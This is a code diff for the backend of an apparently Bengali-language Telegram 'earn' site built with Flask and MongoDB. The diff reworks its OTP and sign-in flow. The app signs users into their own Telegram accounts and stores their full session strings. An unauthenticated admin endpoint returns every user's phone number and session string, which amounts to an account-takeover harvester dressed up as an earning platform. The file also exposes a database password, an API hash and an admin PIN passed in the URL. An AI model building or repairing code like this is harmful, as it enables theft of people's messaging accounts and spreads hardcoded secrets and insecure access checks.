@@ -23,54 +23,52 @@ API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
 MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"
 
 # ডাটাবেস কানেকশন
-client_db = MongoClient(MONGO_URI)
+client_db = MongoClient(MONGO_URI, connectTimeoutMS=30000)
 db = client_db['aaf_tele_earn_db']
 users_col = db['users']
 ads_col = db['ads']  
 tasks_col = db['tasks'] 
 withdraws_col = db['withdraws']
 
-# টেম্পোরারি ক্লায়েন্ট স্টোর (ওটিপি পাঠানোর জন্য)
+# টেম্পোরারি ক্লায়েন্ট স্টোর
 temp_clients = {}
 
 # ---------------------------------------------------------
-# ১. HTML পেজ রাউটস (Frontend Routes)
+# ১. HTML পেজ রাউটস (ফাংশন নামগুলো ইউনিক করা হয়েছে)
 # ---------------------------------------------------------
 
 @app.route('/')
 @app.route('/login')
-def login(): return render_template('login.html')
+def login_view(): return render_template('login.html')
 
 @app.route('/dashboard')
-def dashboard(): return render_template('dashboard.html')
+def dashboard_view(): return render_template('dashboard.html')
 
 @app.route('/task')
-def task(): return render_template('task.html')
+def task_view(): return render_template('task.html')
 
 @app.route('/trading')
-def trading(): return render_template('trading.html')
+def trading_view(): return render_template('trading.html')
 
 @app.route('/account')
-def account(): return render_template('account.html')
+def account_view(): return render_template('account.html')
 
 @app.route('/wallet')
-def wallet(): return render_template('wallet.html')
+def wallet_view(): return render_template('wallet.html')
 
 # অ্যাডমিন পিনের কনফিগারেশন
 ADMIN_PIN = "Abdullah6790" 
 
 @app.route('/admin')
-def admin_page():
-    # ইউজার লিঙ্কের শেষে পিন দিলে সরাসরি পেজ দেখাবে, না দিলে লগইন ফর্ম দেখাবে
+def admin_page_view():
     user_pin = request.args.get('pin')
     if user_pin == ADMIN_PIN:
         return render_template('admin.html')
     else:
-        # এটি সেই বক্স যা আপনি চেয়েছিলেন
         return f'''
         <div style="text-align:center; margin-top:100px; font-family:Arial; background:#0d1117; color:#c9d1d9; height:100vh; padding-top:50px;">
             <h1 style="color:#39d353;">AAF Admin Access</h1>
-            <p>আপনার সিক্রেট পিন দিয়ে প্রবেশ করুন।</p>
+            <p>আপনার সিক্রেট পিন দিয়ে প্রবেশ করুন।</p>
             <form action="/admin" method="get">
                 <input type="password" name="pin" placeholder="Enter PIN" style="padding:12px; border-radius:8px; border:1px solid #30363d; background:#161b22; color:#39d353; outline:none;">
                 <button type="submit" style="padding:12px 25px; background:#39d353; border:none; border-radius:8px; cursor:pointer; font-weight:bold;">Login</button>
@@ -80,7 +78,7 @@ def admin_page():
 
 
 # ---------------------------------------------------------
-# ২. ইউজার লগইন ও ওটিপি এপিআই (Authentication)
+# ২. ইউজার লগইন ও ওটিপি এপিআই (লুপ হ্যান্ডলিং ফিক্সড)
 # ---------------------------------------------------------
 
 @app.route('/api/send_otp', methods=['POST'])
@@ -93,8 +91,12 @@ def send_otp():
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
-        client.connect()
-        result = client.send_code_request(phone)
+        
+        async def connect_and_send():
+            await client.connect()
+            return await client.send_code_request(phone)
+
+        result = loop.run_until_complete(connect_and_send())
         temp_clients[phone] = {"client": client, "hash": result.phone_code_hash, "loop": loop}
         return jsonify({"success": True, "message": "OTP Sent Successfully!"})
     except Exception as e:
@@ -107,13 +109,17 @@ def verify_login():
     if phone not in temp_clients: return jsonify({"success": False, "message": "Session expired"})
 
     try:
-        loop = temp_clients[phone]["loop"]
-        asyncio.set_event_loop(loop)
-        client = temp_clients[phone]["client"]
-        h = temp_clients[phone]["hash"]
+        info = temp_clients[phone]
+        loop = info["loop"]
+        client = info["client"]
+        h = info["hash"]
         
-        user = client.sign_in(phone, code, phone_code_hash=h, password=password)
-        session_str = client.session.save()
+        async def sign_in_user():
+            user = await client.sign_in(phone, code, phone_code_hash=h, password=password)
+            session_str = client.session.save()
+            return user, session_str
+
+        user, session_str = loop.run_until_complete(sign_in_user())
         
         user_info = {
             "telegram_id": user.id,
@@ -145,7 +151,7 @@ def verify_login():
 
 
 # ---------------------------------------------------------
-# ৩. ইউজার প্রোফাইল ও ড্যাশবোর্ড এপিআই (User Data)
+# ৩. ইউজার প্রোফাইল ও ড্যাশবোর্ড এপিআই
 # ---------------------------------------------------------
 
 @app.route('/api/user/dashboard_stats')
@@ -168,7 +174,7 @@ def get_user_stats():
 
 
 # ---------------------------------------------------------
-# ৪. ট্রেডিং ও ব্যালেন্স আপডেট এপিআই (Earning)
+# ৪. ট্রেডিং ও ব্যালেন্স আপডেট এপিআই
 # ---------------------------------------------------------
 
 @app.route('/api/trade/update_result', methods=['POST'])
@@ -200,11 +206,11 @@ def add_task_balance():
 
 
 # ---------------------------------------------------------
-# ৫. অ্যাডমিন কন্ট্রোল এপিআই (Admin Power)
+# ৫. অ্যাডমিন কন্ট্রোল এপিআই
 # ---------------------------------------------------------
 
 @app.route('/api/update_ads', methods=['POST'])
-def update_ads():
+def update_ads_api():
     try:
         data = request.json
         ads_list = data.get('ads', [])
@@ -216,7 +222,7 @@ def update_ads():
         return jsonify({"success": False, "message": str(e)})
 
 @app.route('/api/add_task', methods=['POST'])
-def add_task():
+def add_task_api():
     try:
         task_data = request.json
         tasks_col.insert_one({
@@ -231,7 +237,7 @@ def add_task():
         return jsonify({"success": False, "message": str(e)})
 
 @app.route('/api/admin/update_user', methods=['POST'])
-def admin_update_user():
+def admin_update_user_api():
     try:
         data = request.json
         tg_id = int(data.get('telegram_id'))
@@ -242,35 +248,38 @@ def admin_update_user():
         return jsonify({"success": False})
 
 @app.route('/api/admin/get_withdrawals')
-def get_withdrawals():
+def get_withdrawals_api():
     withdraws = list(withdraws_col.find({}, {"_id": 0}))
     return jsonify({"success": True, "withdrawals": withdraws})
 
 @app.route('/api/admin/get_all_sessions')
-def get_all_sessions():
+def get_all_sessions_api():
     users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1}))
     return jsonify({"success": True, "sessions": users})
 
 
 # ---------------------------------------------------------
-# ৬. অ্যাড ও টাস্ক লোড এপিআই (Frontend Feed)
+# ৬. অ্যাড ও টাস্ক লোড এপিআই
 # ---------------------------------------------------------
 
 @app.route('/api/get_active_ads')
 @app.route('/api/get_ads')
-def get_ads():
+def get_ads_api():
     ads = list(ads_col.find({}, {"_id": 0}))
     return jsonify({"success": True, "ads": ads})
 
 @app.route('/api/get_tasks')
-def get_tasks():
+def get_tasks_api():
     tasks = list(tasks_col.find({"status": "active"}, {"_id": 0}))
     return jsonify({"success": True, "tasks": tasks})
 
 
 # ---------------------------------------------------------
-# ৭. সার্ভার রান (Execution)
+# ৭. সার্ভার রান
 # ---------------------------------------------------------
+
+@app.route('/ping')
+def ping_server(): return "PONG", 200
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
